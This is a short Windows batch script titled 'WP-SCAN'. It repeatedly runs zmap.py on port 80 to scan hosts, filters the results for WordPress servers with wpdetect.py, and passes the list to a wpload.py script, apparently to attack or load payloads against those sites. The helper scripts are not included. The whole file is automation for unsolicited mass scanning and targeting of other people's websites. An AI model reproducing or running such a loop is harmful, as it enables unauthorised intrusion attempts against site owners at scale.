@echo off
title -----WordPress-----
cls
echo    -------
echo    WP-SCAN
echo    -------
:loop
color 0f

cd C:\Python27amd64
python.exe zmap.py 80 200
cd C:\Users\root\AppData\Local\Programs\Python\Python39\
python.exe wpdetect.py C:\Python27amd64\list.txt
echo _________________
type WP_SERVERS.txt
echo _________________
cd C:\Python27amd64
python.exe wpload.py C:\Users\root\AppData\Local\Programs\Python\Python39\wp.txt
goto loop